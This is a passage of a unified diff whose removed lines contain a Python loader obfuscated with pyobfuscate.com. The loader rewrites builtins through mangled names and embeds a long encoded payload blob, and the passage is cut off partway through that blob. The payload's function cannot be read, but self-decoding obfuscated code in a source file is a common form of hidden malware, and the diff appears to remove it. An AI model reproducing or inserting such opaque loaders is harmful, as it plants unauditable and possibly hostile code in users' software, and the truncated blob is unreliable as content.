@@ -1,22 +1,824 @@
-pyobfuscate=(lambda getattr:[((lambda IIlII,IlIIl:setattr(__builtins__,IIlII,IlIIl))(IIlII,IlIIl)) for IIlII,IlIIl in getattr.items()]);Il=chr(114)+chr(101);lI=r'[^a-zA-Z0-9]';lIl=chr(115)+chr(117)+chr(98)
-pyobfuscate({getattr(__import__(Il),lIl)(lI,'',"https://pyobfuscate.com"):"lllIIllIlllIIIlIlIlIllIIIIlIIIIIIII",'pyc':"""87gBTHr-f&#ZcSV4&X$~kY=Kg3TIL#cyKsBFj#<ExhFDNjFQlAsjHLO<WoWzt4(m8q;R5iBI4Q-9d0a>WiSq=hDPW`Axu7)x1-Ss4KpW4D%+gY!8+QW+(<%pI^dZ*h~{$iKHa3KUhDNc)Ms;*Gj5q8N=pJNbd^k5d7qAQ!7jTe_<u1n^+y-O<e~MKsDn=)A&Kkqo3R8SDo}2yh*Q0PiDR1ZI6hIe)309TXEeoSg+0hLYzDg?m*daTho5LuG_@-b%O|AV%0-|JV~RHIvDVz@t>8{8i|3#&D$QPGETY=ySa*3G^*si#o+TD?R4z!LxrNW+ZdfPD1%PDsKE_=fdq2A?*-cZp{~yQnmVRdk$@gK)QE|{=pMV{#cznOev9KJv*mwT)M*WhOYpS|$F)_p7-zi5czz|`L7NY5Sm))oR9s$w(b$}<5h-+#Obicwj%9zJK5m-$Jr#7^jt*YTOdSxIkC%v(<1Z_SX_#Dc>>v3JB>34soWyCY|U>BaZ@>$E7iwD$Akw}j1EH*&9&iI<n#e&Ven{_Sd>V1Odqn54Og8QNHz)xJ2XbPJ|QI0~{|3*Tb(K-Cg#OD;OxR(0OLN>v>@4<Z1=bWtWB~<}!4m@dSYNl}N<EWJf@@Dq85)8g8@%~$PkZPJG`epX#Y!Y@nryO{>M%Wo@R*za*UO}fPTGk3DT0BE4?+<b@Ae=V)U>`pz_0&XloE@Zan7k$R!oFI<OR(3$Nl0OcrbrWLRlDe;o0AT0aM*P?#7vL}3o)gh??jWL`V~&2q;Kx;dDJM+&dF5K&cpDNNDv_BAaq5hlN*lL!-!#-)@;7w(Atz2Jm{I#YMPXOMe5lt_hq{n<#eEIPQ+eNGfGV}6uv9pjycuQlr4-08AIobDqZL%JWggx9^LFYyb4XtI!wpN#>{yk7(T|#&%08n#p8(`C?$*>9<f`|N@}rp!-AbL)N}gi3ePZHXZMIp_iYyPiLjrrV)8Ho%f16l`^akpdJUWW3HA4!Va=R2e!WxwY)>mKj(>%KGGqmn5eUWI#xpjI(gkv?Xk&OH5vFC*nXn3;xu+l^PEZJ543A{R^s&`9j>tIhpV)GHQ4zK|jVO^Gb|9|R9GQ;fW$o&P2gwdiZvnAxCy$fSoKHe3bjSIq4}vW{w3DJ)-!z@?T!~9p?}2as?1x=@)bX_pqS;Mq>q<0{;q)zoeeGLvLkW-e)OX$!&Z;Mfy>ex7C-gMBP@7K8tPq`bf9op&=j=NqZCsO@t&5dNa$Zd^RBfd~elIj96Dpn6Nhht`8*%02uAcSx-+V@rMhi1?ygud)gX-3O-*D~eHJ-?q@QbR2%doR2joj-x4z#IPDt%gTewL{mm@Y+_#>^JN_{e$(xX4f0ipi27u_Y(KiZ{&_H>UbUjjsE+9Z9`2a2S>n?v2KoNdT2wmtGOGsa`^VNn<TTh!d(m+0x>GB){Dg0=pEy8{u1BN@wn0a;xIFfKJHNuitEQ4M}q+VQOy+eYBO#&ZeQ-AKS93RTSUt#r&Z?HG&UJTh|t>D#$5@8x(DT5V#>vVW$qx1V!YV)UP}HR2{`_$5)PSit|ky6D>MHTOQs206ipwkd6qoesv-vbQ?X9S@J_P7ZoRY%4AV)YCUH??u9MK17*rLg)WrLaX78*FLqfJW}i8QCxOY&Bm_lfC{xcBT`{gwVi%&n-Ja49ML|w6m|l$c5*{g7QZMq!oDadSM1aHwO+S4<9G{oorwtV5oz{eyyK+D9&79jfVk0lvlj@cKG<iB%!jg3sG?7%tZrw*8a@Y%)J4$$b1sHOj)M4;PoSjVgFdU7u3je9&rq~&zm9Uo_8J&-J#`D3m!71JNPzeKVI-PtKYZ>Faiz6+?Css%T{fZ~Id|Q>JUgQcO?dRQYB@cT{ibF@b9*oDVzgiBoL5sai`fWuFffRJ@j7+lPUl_iE^s7wR9Yrykwy=wFHZRLK+h5-UAwPj}ydSaGf7!J40&Ae0Bl~IlLC((`<22}+B-P8rWY6p5XC)_s8p;!~XW?Yo>(*UmgzTmgWvF}fQ6Qc0^ryFV=cMJA1^>%DM2jD>b_QCrp8CJG*&klDK`GWN=fhawqCfG8H6vz_2*93w-@4@~+c94`EJ}@<*i(;s>*%Q}w-BN<{p70q=DLOTVO{*@>QWI9di59<z$|FWrh>*y@E36<G#6=cK(?bt>?UhsA&(56Mci6V2iHO8z%|cvS$iD~Qc1s*Ag4SdKR8IcKkMaZmUELFog=rs#oU7TLc6csHtRNQ!l;~tI=sZ*F4C+Y_lechwsedCdxY_f2%Ex;tS4$EJoeD63H_D&3QEY#al-1#P$ZV!I?gc#L-zw@&}6Eu!8ZRkc4>wLtiXTcMbzu(s(KC!Z`bGkp-CeN2Q6uQ-oy-;6QkV>F6sH}x~oc`C{gRL7tpK7KkS`c&DQkgfcCgKS!|e!uH_jA2~IhEM}(G^HvcnfGKD#&1VrkMyd3}2lT<UHk;#*Qs<3y&D#BQIm7q8Y9TdemfB^H#$Hywx#9aYQ7Snm3>tJ@7nMAI@BH0?+$WwZ5v1^Bh54qT6gZ1mnFkh{t#2#liZ3$*U3)}dw7P1<%zdPW!8#)F3bj=p`n5BaQ=IrQOB^&Pvk_O?B%9r^0MzCO7P$<biA(2-$L$8S|J^66>E|tvuImVbDQvT!}lFZCVanfo~5`;*gNkF{1<YE<BBbqXY0zf=BGOa^L!HapTPU0F|9TrX{Fi(<oOC*faRMIUROV9iWsF;80*7RwtilF|EY6NYeWV7zl5A<2(I^a&zSY0+D`t)zo1mc^Vpq9!ooRKBU%5uK%AO9yAs!6xQQ)0s^s_Lnj9da24A$?xltcs{DH9fJAXO+@<uK14nyOz|o6r{sVHrt3HrvQx=d8oBXG{+<<m)9O@8g;wzQ0L%gkeJI|c0@>W=&&W$lz73~6hD4u7E)oCZtFUF-eO{$4)qBoX_=3{u$_g_QK(5ckCf<rM6nOuxsM+3vJ;i@<Q5L1xj)brg>d6dA_Mk4OHbHci3Iot3jAY9Z%IAsADlENh}SkScXT+)f3I4D^jXUhB9v^E*c~XberxBnve~B~W=ta#DX2N*E_qMY;?6;7J+azbgJHcwFUHBrtsB3bu+90K;yrS6sO%yN==vJ`%ByjOkh7)C*gjL6n&nP{hiZ+O$<<hh7LS;`fIY{SOuOOi74Fy>IE^TaJn^pT-2Ww&%+sPoA_GKLXc{JE_7ixp6+fZrHy91OuZ5e8=H7*D!gJ)Sx<)ALw!%!{)z|9J@WpXGjEh33t2*^~sEFIRaI&7o*YN-?3>YuGs)_c6qK&{KM?ku}52T~z%QPJvsoVkG*xZUhVpms&#rIbG=WOukEJ24rv;0nFPkOzqgun4*M>H&9^v<gh=79-nUR%qyx<!BArx{#L{N5;StGs(#cWyYA&2}A>uTubdU6?nx#V}t7QM>d!EdRQ3Gw3=>ELWk~%&ZL8<_h28!WbTyxrpvW>+zxkcvqd4GN(w_@ujKJE9!@sD4E&^MqrcvZi$tr@g^i8Inunv#R>sWDyiCJMn&i^ou@+Sa9$tDG+HLX{K+NbcfU_3P%XRLptCK~nr9;3ZhdWxaZlT_)x)MK9}VbKaQVyJxYy+izc@P6fHH#HAfqr&5wCy0zCq+^AzA*E_BFu;zFx+ufEaa>3;kC-oC}EV<PsRylqFDQC(kSg;HmhzY8<nM7xm4X%fZDsUokpVu-=qydeOc%Al(+bPlDH|h&VBD`epj#1(p^Y4$h&n8US9qJ}F^TNUuu=n}F*!HQoLS!CC`h6i$hEImBe&dS#l)Rm6(k0lOvGVSnq~iwtr<geY3#-dKt)=7<(OrPU|`es+U-SY^9(aQtN~poG3tf#k$~vLav=`<%(m?91ZgM!#ze08GJ!W(jrPRD91}%sUX=XeQ8Ov0&{`Uxi58IOuq&?{~5lm}WI6h|Iu~(<Bjx(m_z>^Lw8C>+Oo&)Y^!x&Xo?UxIRQnP3lc?M8i<a!2j0}t$y;N3+AVs24Kb-akl}`^O3OBx<Royz;&T#Q3qoVb4+IXRhP%-H@`Hf$KwhACop?O`$a02ve3}St+p{`KqYA?aoiGS@%u^~;iFbI0-V(au-a*hh|$;Yz&*e86P*gnQ1cXjoqjBa`hoSwI{qMA4#paptXsfJ%{SKLTnLX+F-qjgMFd!o5~|CHb)YMP(X&K{Rf+nkP!Dj~fCO=2*#BogPkD2PF3q|gJ*F%+i7-b~9Pz>-8SNPp2rTtJ(qOL3YEFxC8zXGRh}aG62T8X1%<$0z%LBu?H}K3>_~GyYXZ8L{D!x*45VMZSKv0l(hK{+|!c*}!v}eTqN9jT!a_e>w0WX0usu0UYL1`1XN?mWTD}pe)m1m`AN%>x+zZ{=zmVNs<U~gbh<>i8ChNjf;(*EuQSh^AGTmAMp0J|=wkt+|jBlQTSw^ajf-cl%%%c5N&DdH434ZyjQuG!A@{A7z_R)}=vpE2@$&QN-}HW+wF0x*tJoQ}lL00$*|$AFJpND;daiy<W`0VqTArLnb1+6+==>?t)2p=18k1fHjf0p+wjxgL{T+^mV(_UEXRp1_JP|36&%lMRM_sNGfoVk)<{h?yu&V`$K-aJAexk2@Kbqwdc{FsW|IpGGv+8BPf+5Sn=Ew;r^|4CC$+Zyc?mV#=~>$X&R`QS;YYUbclDcSW7YZx$1+tGdwSyLu-2BG()uG{(e>^@$Mov*w$1<e#8)j+0RFV<CG_)7=$6anj2m_`2o6cqe=t(L!n8V)D!0hp@5akOb2L@E-*<PsH)luTez(|8s=HzJ@RR4Ms4M5*8rpxPB{<(^pB4l|bh&^df=<@>*2E5Nh5|E}(!TvM+aof~_^)1w{?Zp}i33QNuf8f*!-jSm9lIdM8>H3X=YXE~1t0tpGLCT{m-%;dKF|YoFB=jN?m@oR^jzlCE>o#&s|k`!kumN))!%E~)kbnhG%S#f<?SKeYtcrDT`%kxvb4U9V=J8Co)NjY!DlBo78GNnEW1=9ec?DoZisKCkYREkEHNM_@PpX4gd(Zl|+BM%Ri$Bj_&)bxhd#-iSl2z4q6h`1S#r+k+7Y$`8RF#X~r5m>|XVR6CILo7q^9Pa#Q2`Z{;wNAjcSZx-E)yP=b<NWAQN{^Au&mQvi39&nNmpRFOCVDgg!hi+ytV_v`y$XwqKiD`tOQYO&AB-(KPo}m#%c%wkOQ7+s(KR1~KDCq6?M+eqkcmN$0=#s+qC#hmRQj;NFoYCr#aBM~$<$OQ1V=TZJOJ;m10k?Pyx%OffADDlBU<r{{lsMGbzZj~JT;<cxj7b09wk;Fl4Utb)UiYR+hb6dCHYM3zaNij6E(Y!GbHHL{<0`hm`iYHD-$lz_knPC&r-P_%qBm-x^O#5f72BBz_y{hJRc5$FzaPIj0qzSB(~2bo_$EPycQ4Ab=$gNl1~)>e0nvtvn&x5Ruo!t*inPoq!95QQ&jXe@jXF4m2%dMNkJ}<2e*6r#spD9;6h8WzZ(o-5<{BJ3XtQ1&kv-TyzJPI-^>(Bp7oAy!>4|t_F_p9|wPMe2BGHgbwIV6}R0fxRA7``k`oqUMhzL($@NWF8xMiJ0L@oY4?4ZpMtQEvi_UW~E3d{_`=<|F?wa!$bBmhBVD(e$o^iZn>PB-$2XU!g~_9m7sF^l_s`6{%@NAG&Go*I=4C>`XaEq_!pX9-R3cYJe3mgMw!MT*W@E{kMFLTYuDS!7;crf{A9Fj5!q1V(xE=!z1?Fr<9aM+Bu#!;pWv2ij$xpqM)Src-I>Z64QXQc*vdm`&wdP4F+g9ms(TH+WY3I7i(&WxbPBO*bh7)Q!ZZ+;Sn8eEu%p2-L9$URgeMW%1x<u6Sh2b#XoOY192LQI-}3B*Q=&hD2v7ptK`#^8Me#ktF@i@BHoe`GK5HUMdZ+->5iN|Eg*|B2I?B1if=V6c)`)o>NQ{(CNMtOhSq3#*+9rHBGdpj1j$8KubIU5o#2LEb)YKj1#ulk6cnW*0+3A(s%P<6<`W9`C4RrYC|BYJcn(@3rpxbu>9qN1Jt!{HC{>n|E`|(`UF#JFHBKKq8A|49|1dG;m$OBZb#f()K7n7Hd?xFTIW4y$TYWTY8bdFiqpCc;t#cr=B)XR{rfm4arZ%v|MO-6&AFwN8cY4m5_2sV&Oc%R<y}=wD%ie8cE8e4EOzXzT09V@OxkO11VV8_Rgh)PUwVZ!*lcS~DP$u_iY@q6Gi8dnH0_k2kFZ!9r>R=JS3Q*%D`q7I`<_Vge6Qh{?(%7L(+fmWdBCs|@0Y!vsy;Rum_u^6At%!;Lo)omnCT{88p%$OpT6?lyC45)it0BO?wpPWA)EfGJh6?8D`BB|JQK=Gg+&Sb>6)dMXR4Z-!OX#94qMnhAJ31w^FHoqXa(xQXM>Wm)yV%OR;OU)Q(-BBKiOpGidT_wfXk{a)kso3tH}gP>lapn03)s^uTjr@M`gwQ<Nmi=HW)I0*0VTn!RK{o_EaReEp9Ac%PMf)&uh;333uj{+3cmX5#}fDm-+lu`pYp2JU_rlU%Dwf)^mv&ZdKX^lbj>6LbvkTbGyag!(9<_77$6XdRKMQohrE3`}Z--Wy{s$mmtgfb}FgIpq~pb1TsNsxOK~Y7~*hRj|}5Y?z&&LdpTdLydwz88t74JPZc;3>j?6U=*dCmu#%u5)pM~Y5EC;nB(%sEn)Aj6WnDY^*JJ0et@)tShvusPW|1?7{D@*%ORug$-t5A%4j~!|j)saL{sgxi2?ZbbgFNahG`*rTRx=`ROxBB!_uy{GOKZ}Pq_YRE@zRK^4d5=h>5!&GM+ynx;{HQMz)@wb6y;ZT3>Q9bhCXR2$f;zO@C@32IF$Yd7PZY7k0;6p__@MO4|;Tjpx=vHVb)di1+m>fApj{3g0>b#vGPittUpwc%Nai+8K~>{wx)SlzWZ?|dj<y)K=(wSwMYZiwHO>df@CJ2N%HmxF0#BPRF+#&9?Kk_5hM_dQ%2UXb3UQKJz*_GdmoF=lXAjY+guMs7oy7W#;X_oUHXz&+k7CyfxLcq?Hs;)?3FQlS2b7$Zjz}LsEFWxO*=2FdeD9heAoilkZp6tVonm#5yNA2ou6}vm~sZ)$D1f$L^diDGi#zjds>0Zm*34_4`LD-(Km1?C&sd5UNjN3ex_mIBxMX3ZN+O!k2u`x&=pxSsPMB$G6dI7RX!H4hyvM~12#Wz!JynW!5cJpBNq4}vs>j=^LKEdxM2>Avh1|LE@g4XvMmhCQ{}KSY}6E#934kIZ^`+E14WQT7!~gMbB0tl@k{mm<Cb2n8^|ngpU<I52)b@2%*5qioh|IY#(Er_;K~br0Oy1Ftmmo6a;?iWZ)md$I2>QfdP+`T4wJw-E^lLoLDV0;QZaN?Yw~uTy{6+eT9EszH;dT}Tt<P;sKLlTxUVQ3(BX_@k!eJ_++wrYe{^nB2p<R7=g=U2&rUSTQue%Ne{TBw@2V(q+$vXecIQKyA-6eclUs2;y$`{h*#^mV>XB!MepNOdHOo_$9QZ0KFWAX}J|@)fDKhtWcU&P0GcrG`;wjDh)cxsLP9Bkm;a+3@1i(q8bWudb89M*ofP8=ZpO%Gir-5|DW>goo-|lTE2L^z5ZH!zD>Dh}KYAgjL+YNUZVFbrC6c-g;0<<Dp=qHvO(<UG)5P(XRvOd!KIa@fu-XAthFj|7Rltt{^LMKr3Va3>qP;;v_SFN1Dq(%Pp<iJ7RM*rjPzvEOYPedSuHbVf{98@vw&d$vq23VJovSlfYJG!dlU5vRZa}I0@AL4hc94TOz3^$H{Y2zb+#*|7kmhNS%gDS}pZIy>vQAm*z=M3>aPL+>_6=&>Y;F?msFrJ+@s>lA#*%Pd7g}^W+IkASp=Tq6!E#UeVyBNBDa@W1ivp`bYz)Qhdj1)sA5mQX;_+q}q+l^kkH6D{kDH~w@k_%lu<TAS1FK4N@tpM@Z`_!wlQi*P<PmFfI8<TGi#bDfz1ieNqK9(2787#b~-a?e1QpG5arT~`fbiMN|9fnxIUitOI%fB6lg)T1I2|FP1F&S)u+y!PT25vV*`Me{C5Dz(F3Jx)vqG#J&nZXp-rzJ>I(%<(?YH^TZ1U<=F@_V4Rhgm@OGsFOXpFuBY7Ft{E&VyLrCY$xfBNQYu4-d?O1z;oRdqc-+h#Acx=foR_Lw64D!9yVnEB%<Uk`71#yojCn46UhG7qa>XE@a;;JyTS&A~#h%Dq<o-?C!DDXa4^(V39V^6{35SETLUe*$K4q-*^n&vTeazaGJ)X%TdEu6F9at?f!RjK(g~2RsiP>7M_0DzYa@pCXrV%*<Ar5v70$e#aM9P2}$Du40+B92r1UZ)#qw{CV=oUro2LhITHVw{n!lO25Dz63OKuO2|^qmP+|G~YwqRzC_$nWdvjF(DDjG(YTB9gUt(DM#!Q-@y5LD$hh@zPiASE#O{b{vlaBB+(-WF<VDyXpLg~>*X_OZp6hOsXijHB!v+oC4=4+XlFoqYC(1>4zLUjy(FIW9h)ZI+9T#NI6BeE4zav8@ZKC5`SDJEKIgS|fasgtG55;*iOwz@!@R=R>1yzt6BP5IGAj<ZOO3%hCueENt0v~7P{Fw=X*rP>DlF4gK?CQ^0xwFSj-)wTf2D8OX?0#Yb5oaM1>*I{%Bf9Dghe6Sc9rXXE^iVuP(Ch8D3Mr+7HGJgb2NCnuJTK8L`g?tQ4M!e4tv4xXhgRP2L&e|iml7zq4kH$-}M(M~_7O0NOFsa)UDokXsRJPUPyK|1zggHzbYi&Cya_u<1pzW85{2mhXm;1asV(BFM)4^&btR|ODjHYJMVp*H}5YE=(9(umCdacGdgb&!&Us!bCA{!TZcTsh(3Uhhz=I5iv7wO`7j#kO~sPV7lvg00}9rp-WPncAScYf+>Y8FZstesQ*RGcaj0L8y15CrEZ0f&eHBp3P&h@uPL8XR(<kpV~dPwjFYeM|332_Z{d17GosP@vzf$6G9`h;HK39U3KyfKXf;-cYG}=$UjA{>iC<CaJ3bw$Ik`V`-+~@&Qm0R_rRNZ%H-#Xl7SG#1XsnM+87~?81HUK&5p%NtyUmOuNd$w3i>L?YtJ2;RhsZ<Sb00s)MUu!bGFU^Iv#26NSsk($fyS<_BCu#48lUGEocvUi^?pUw|aj^`KM`CgH@?-S>nkn+7)@<0T;BB{P{zT5ODGFa}mH?)?yL044!(d`epnkD_I`d$TOt<%I=};+0$}fs*=jq?}0hd^Qg-E7<?D7fYDbe|!?26jEimGZz1rB={z;278as<VW}EujV-K#3rG1`BItL<Ayc@Px@ZpXSl9BJpDgVXR_L?ivYUgGHoYRRDpovsJ<;Pv^85aPG9I}4n@5GDmy(1oW~A;8Rz=AAlPr3SD@5(=8vE(wwZ=qesjvgM$-3j(V9B8zgi?76Sglky>WNLcL|YeQOABI|EKzz&_Y`bCnI7c;#plQ(PDq95M8oY5(LcSg4Y>XicdlK|0CH^u!*7iE~ln{LO*iz*=-&MDfnHNX9Le9FZpif)hDMuvb^gKI5nZtco|5Al%2!OIX$7D7-;2<<kbHBYiOBH_UB|}Agafm_(TI;IRaG8uRJX=Bp9v=bcFn1K0<ULPP}A94jfQ+lR*a-1I+19H0o8|T5`(vJr!+BW!Q1n>R^}>f*WFO{I3}9tk`k1R!w=Atr-P5)j9iK`V9sJl8x#H7UuK=!~HOxiz{1Bk{C<-##SHR6iM_HY0L|U*z#Yv81zV2QC7njd*}o<t@)qVL8wtv`E?{qwy004g#>?2%7}z^-zY^nBf*HUmMfO)cRS;K4wRh5H}Gs@YrU9R5tl_`@tRZdV16>d9a~N|cBMO}V|&gnH4Ab)fd54(z1yelTK~u*I^uBmZ6sRi$$w=dbb`&4uuPW`5JVxaGm?jvnJg&jV*yXa5`lE8`r>5!C^Q6eqguZWubMWP^U=~IQKUZg^%eXyVO_peRM#wGD+r{C7<#`62|cC6sHUrCrxwquu6+OF*>r-U8nBnK+X=+@br)z2{{#M;x!M&^o?DU%Q3)Q6YXYQ8x6^l7TmpSN*H#M53Q4Yg0dQaCW9iJZ!y9haSdZXH7NN;q4?a3lRWr@WPJTM~(wh2IpE^};ltm7uPc_GqW-o8SM2{GlVtC(1tSWS10bm!}xCc}ZBT}N{{NC8flCX20-Rg*}J9ur{(AMPST=mKMWg}+~@5>d@2WgJNBqHl5?34k|n%Y1nFL(vL$p0D{*av3%!J>*-G(bFO2|`EAW>2DQfg7qlBhVS)CingZwCw~T1kauzjiOm;PtW0lc#Q3Nj*B(ZV>z>^Cijggnn=k_Cza4Tsg)OYEKbcY*R^AjDw!>fnC8*C)4S&{HwOt&Ge5Oa)X*J5Ssk0-YoRKsqu~rQ?&ERNDXMovKnj{dhEq)WM8l8XDs$73?HKt0z+YER_H<*Sp!RuB&7TQY_=|R!#eEF=quQEyCng{ybq*(|eC~zqg#LP*uyAs`gKiy3j%|*XIAQ>GEF9dPE!JeI44y<!0s^+mD~+K5`1J2K`Cah7ozs46c|F`u$FtBJFwvAJ<cCqkv+S4G<L9e}!7~M8`QS{rBw4l8m)V4x>kGnTQJt@BjuwEf{~2nN?p$WB(P2H`9+<kPLYHLVzz~v#iX*+C5z~+<odnC~Mt4^ym^nyqPy=OmZ2bNt>d}xyWA^~R$oVSt&qTZM7uLqeMR*{7=k+{WsmT6jtYF<2JEs5L^^fIB8ypO5)ZyB-8cmN)1kO9(qaZyo&wUKL9eWk*<cFrVi^(&j-Y@AD{YJ?jwch2sB(%LHJ9|MSlFv5K=k%)A-asLYgFb#9a1lraC)pJ0LAlQ8pD)hbwE7;)+g+BvP|+dUI#EoPwbQ5-he3V=zNhGJ3$7@lp^-q-H-J{hR*!*Y?G)gUfcJBcqeDKBog%Lm(v*~>QUl6yOGn%L>1GClH335C8UHC!7fgkpn?6wWNI8qy`BD2gn@TcR(DqkLwv|j;!)3~?pH?B53ZK-7WT`H9XQxp_ght^xhe7V{WOG9Ne;{TmHS@L}c@^T2LY^poalbsQDA^&p;Ds;)HHrR;ocr;Br%GF@eDlaK0Qi`XlEnwW7fQ(c=%<37N{Uq|ZbYt`PgtGtRQ7sq@Kkq}D+qeJ=|AGZ8<JB~jd2PZ^<gK+qh`sjbo;OUT-BE`pKHoTJG&;d(k~Z5>6azMbv@l7%A$ws`6Cj!#a{mwCmeAZ=z9jc7~4v+Xq9znL0;{$!L(3V-)ZIe@=h}b&ztI%&_MZjgh;37pX(2^nrdDAKwVkg&j)!a&?K2GH;2kOUsxWu2YWLfyIDdGVd={2SAZ{yEir~n%D)@@sIKf=L|ce>6RwdQD)+>a0@Vf_INjLDKqTs&%(G_0-?pVe&KE~(?wRyCXaa(63;2e@)O@u6g$)v9Dz~O3@6RhESn`Y^X0ON_oy<uxt110Yf;@va-%w<7WFqMWGz6CN)I>AZ0ZmEo@93642s-tpTZntjr#*^8Lw0S^pbShPUZ`RfO*9!N?W1CXgEB{wKz3aEN%71cOMCQdmq0%p;?SH@Dvp9j6Pvw$w9kooFSqpT!A|re>BBTI4;?(2=B{pK+tA5T%u|I9H*DHAiHu=e9DL!zLNJrOUWO4nRo+t@&X`z``5L9~Jp3MQHv$;u<{LuUf<m07`R{$@cS1W0Q@L#S0~+B8a;lM^AJq%^O|Q61CP3hj#u!7|I`+7ke4Ofw*Ge?801raO^p+6ls-g>AO@?<sm+8`Pg15BDvf}@V(K>R;TQ<$B%Rd16C=9A}-9%a(NJ;CV%9=0oS7;}eC(hUNe{Iee6Z|To4%pjwF@Sy%WT*aWriVNtY@)xN<ZKcKm`akVQg{kk-4QL;@(2gzhHWq=DxUSt_@3|&)h@D<m)Ox>8tH=_{w$79g%wF*hKD(wMW6=<-g7wR5HZ>sw3F?}Yb1*s_&9m?S)5PNi-SV-{H1WwtbgjDjy9H_y*T_Uf7OvF)gWD_Y6Qlhl9HrI)Z19?7^z8;KKCvRf=Mywh&H{llyUAX9Pl6=6jIIU;{QzI<06Kw3BO%D7g%ZL`3c@2TEMfE4l^_uoU`n@wL*i9-<;84KT)w3|FP7L7YyUVN#IMb-r>+Ni*9OWPc3{Ak<imXp3HfatuZTOZ0s(Eimx5{P(4gV`grty4;$^<w=qd1QH_U@YUE7#LFLacN6#>eu2s(Gg#>Q!1`!~KLtSOvY1iKhb$B}R+DORz7r$|@y}h)Q-O<dKEygPCOlT*J_;1~giRyNN^n1ehCNmcnI6eo8;f>vBSr9KA?fIXxKb>j!np}6d-7!RA)-gEtNb{JZ$-)3;Xx__H5D|^Gy2|65Tv@l)?FFsCoC0Qfr@eoAi<-+l1tLH^EK)D?tm!L6q?kUtv0WQSIwf7MBx7d%VMxD3jM%b;hTyh!S5e6ALbA1+wv3n!bD$v=i}h=RNo0F2WazcY&-oekN9g~8E&m*4j5qgkA`(I!<m400c?Jw%*R$NIqsfJ3s7!m?#Acy^aT87GTrd{=m28h?4_Xw(1Y)-J7#bs3U7xoc$~YS}GvrpvCp4B8IfXb*zcGrtbm_u(_b&Y%p$Vvny3-T}c?yBkvP3<JbBj{OKtJJ{J>0gs?|U;tezLT#$eY1C_R?{<Au^Xu(PwI;^uM$vA?HSpj35-j?|N9^toLKW<Bwkefe8!t<_0ABI&3f;n_*t-m{vbwTALE}p{eg_OFa_kz@iVxR%)2Hg*mk#1EnuNMzWyQWj-j7(0Iq+6BvqL_7xA1^O=s))x6K=>14(Q2dVSy5XTgYnhj|>46h6CL37$f4yUkt&weW$kqy_;kfgiNkF(`BlTOXOq{Dj*P;LgrYa=~n4^=98bNodI-|Oy`$aG>u_k4G-)2cHVd~df+giDeslH?ip7Z7-kMbXN_UuvV0osr17A+zo{MfMfmR8uA`J<0c<%wmFlC8E;hp1z!4^E|!|0yjY9xG-oj^Z`s(Fo>d(Z*&4FSio2XdqI!eWZ2_||05n}aKaE2jt;HVcqDq+;xMH?o!X;jJG8Pb!GGO6BzSjbBn+k|BcqmUAsMh1n1RN*jjmK-{vP8F=anfEEKY(hK#zXXOFJNf`ZDEe1;npFU<Tt2+Ru=8WyQJI(aM4$84v!0trSXQ)nT(-P>M9S>l!zo(kBN@I_H2w;2X=sH$Td(31}7F875p<q&PxRXlY;)WC1e3O&zEC+UWcAg;3Hfa&fszqjC?dVvEO{U~%;7MvM5LC=xthQl3QgJ+UDn>=QO03clepQ5y9s1F4j2yi1mH2+m_*md;Skux<NZVnPEsT{>(uCm&xE6sDLJp<nYOBAlVkTSX?U?oV}}@6lG3tWO)iJnjCpIlp*us5~w^>`f3Gj+Mnzs#>1-)pq@aO~K?+7+s5(QcR*$9Hqf$>tsH-G%?@b8Y$@Ry?PJ5pirq!wCw~7WeMeva}@~$ogCIuOcmx5kK~6Ia_X<pJ}%=jPz|*+7Rn?Z1_w>8h{wX|lWgLi+sVW(FWQCeMuf?(1-yt?oKF(BM-I+r6wbMFq_o>+;*0M3LGoe1aZQpHOzpoz2o?I7V#LN%l9CC;I_9(il*U?{!gO$|2!9eamQXEWoJX%-bDw!|C@=YMjVDjrH0;qa(u3~02gnmm<nKY~RiOUMXl4APl4~Z6c|nReL|@nV#__c>b7R_wYXQ(o5E&%d&*3vEvb_w1*l*KMbyQ%eU$QcN8T|ET1tfbrVBaeknZPFPOE9H>&`h<JFXQM_)M_^iROX}%WvuUC7i=HukODqda=ORgx8R~&2ZhbkSzP4|W80=5XPs4a>OJ?}13@P{MDEGwb!$M&-DT7RUGrF1)H=xu`v8Fay$%f?ReyeGl_ZCqLy;{O$|SR$UiG&Y^)YbSN(2AyT)0^6FWl$|LWs1kOjRbs_;vZni=hzL6K;|!FOFa_XP!Wt&fENx5a@rL`ofg8j(VC_M#`bQ=7sWEOMuoLQ<|c}iV9FK?2F%<HkL2!w(f*+wK}5A#yiBWv|-gqXo0am+*sP%GYn9Eb!2_;$Hy9m!4YgyXl;C3+6?!=M3#H#b4kLvhOO8`hJ=;O4wX1#SU#}{n*k>RY-yU87P+qNA#3hZ-T5!tdEI9?B!$qvC%|bRQZ;_aFQ<dG8ye(w1P}HsISf<QqFiMCY6x>^1F-vBUW!V$>1s3?<BLsaNud1oG)|TnW`W3+wu#*4g7+h#o9-KO6rwrC8W={_lU#d#Av&kr<+8AU{-SLV2av*Xf{$7*6k39thlf%KPVV5`F0Y_Ki>(PgpXx!B<voO063H})0nZxfw!Xz5M7`Q@@#g^o#xm3#!6sSeJf{D#EJ5Vmkj<`%(q*+ZOx(ZTZ0}f-j1G128O*{7-jZDmQS<nAR`zZ$C0A%1fmpg>h^Ff}6|_$Ar)}C-j(;22@O)Z4g0t$ZLN=jtNI@X0;qR5G#0l=6l|c4)5jO{2u>0v@(Gu$EYgxUk8z&xwLz8H;#F+ixK`N6o+Q_CDQz1vmWG&n{K^S@w9>oPFEPejNoB5AJO0UBO6Y21w*Ps~znO)?!$WO;(9dPlnhoTpA!D}d+NM(vPe>gJ=0Py|-Z3|eR2u(OCtov6fY&l#hdZeRmUMhShlClt%qR;Rzkxe=XX-hKaLP&%;6*37y@bSB7)1QvLOY#o6%xjHI_i<faeje&gBK%}-RuxgA6MZ#l@1G#lj(Th$&IzjuHoN{8KsqAHXYbP7nkLvZKol19e%@`i_6_(I<U%$Y-6o~fd4kp6Dcua5R?(~S;J^bR1R7AgM#=i4W>rRXNoLj8ky;dj3&qA(k@vUW#($z-k42S*{xO(hR+b<WRw8@W8xGR<as%h;Imd-I$pvZE>P#Cr*3}@A_yaC}$)W_(@GVdbHJZ|%B!=KR)~vdZH&*5e15FdUDlOW0VJcrrIw|EwGShF@*;++OEN`l2*tcAH(G$fW5cyO7u0D9ld9rx6Upp=vr49-Od3=<)pC&xhPR6;t`wxvf_~2I(q&m&3e)&V=V|628&fqMpB&CK!FHa0JW!286Y|<JS-Xjk%rGmK<seEleW%K;05@0e;7e-MIx}$q@YYajJJ$xQ1rSqc}nrSO=htMAJ&4FlOU2$@0u|yXd3<9Q=L`OW%LY|PD?9c5ACAi>edvS$2{P=Dcz$ApO@*r~x9u4!pJ>*y7d